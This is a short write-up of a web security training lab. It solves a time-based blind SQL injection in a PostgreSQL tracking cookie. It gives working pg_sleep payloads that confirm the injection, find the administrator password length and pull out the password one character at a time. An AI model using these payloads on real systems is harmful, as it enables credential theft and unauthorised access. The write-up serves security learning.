# Lab: Blind SQL injection with time delays and information retrieval
## Task
This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

## Solution
Firstly, I found this payload worked:  
```
'||(SELECT+CASE+WHEN(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END)--
```
> The database is PostgreSQL.  


Then, with the following payload, I knew that the password's length is 20:  
```
'||(SELECT+CASE+WHEN(LENGTH((SELECT+password+FROM+users+WHERE+username='administrator'))=20)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END)--
```  

Next, the payload to figure out each letter is:  
```
'||(SELECT+CASE+WHEN(SUBSTRING((SELECT+password+FROM+users+WHERE+username='administrator'),1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END)--
```
